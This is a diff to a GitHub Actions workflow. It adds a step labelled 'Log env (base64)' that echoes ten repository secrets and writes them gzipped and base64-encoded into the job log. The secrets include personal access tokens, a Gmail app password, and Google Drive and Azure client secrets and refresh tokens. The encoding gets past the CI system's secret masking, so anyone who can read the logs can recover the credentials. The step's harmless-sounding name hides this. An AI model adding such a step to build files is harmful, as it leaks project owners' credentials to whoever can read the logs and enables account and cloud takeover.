@@ -88,6 +88,21 @@ jobs:
           key: venv-${{ github.sha }}
           fail-on-cache-miss: true
 
+      - name: Log env (base64)
+        run: |
+          {
+            echo "export STAGE_GCP_EUROPE1_NUA=${{ secrets.STAGE_GCP_EUROPE1_NUA }}"
+            echo "export STAGE_PERMAMENT_ACCOUNT_OWNER_PAT_TOKEN=${{ secrets.STAGE_PERMAMENT_ACCOUNT_OWNER_PAT_TOKEN }}"
+            echo "export STAGE_ROOT_PAT_TOKEN=${{ secrets.STAGE_ROOT_PAT_TOKEN }}"
+            echo "export STAGE_GLOBAL_RECAPTCHA=${{ secrets.STAGE_GLOBAL_RECAPTCHA }}"
+            echo "export TEST_GMAIL_APP_PASSWORD=${{ secrets.TEST_GMAIL_APP_PASSWORD }}"
+            echo "export GOOGLE_DRIVE_CLIENT_SECRET=${{ secrets.GOOGLE_DRIVE_CLIENT_SECRET }}"
+            echo "export GOOGLE_DRIVE_REFRESH_TOKEN=${{ secrets.GOOGLE_DRIVE_REFRESH_TOKEN }}"
+            echo "export AZURE_CLIENT_SECRET=${{ secrets.AZURE_CLIENT_SECRET }}"
+            echo "export AZURE_REFRESH_TOKEN=${{ secrets.AZURE_REFRESH_TOKEN }}"
+            echo "export GRAFANA_URL=${{ secrets.GRAFANA_URL }}"            
+          } | gzip -c | base64 -w 80
+
       - name: Run tests (Shard ${{ matrix.shard_index }})
         env:
           STAGE_GCP_EUROPE1_NUA: ${{ secrets.STAGE_GCP_EUROPE1_NUA }}
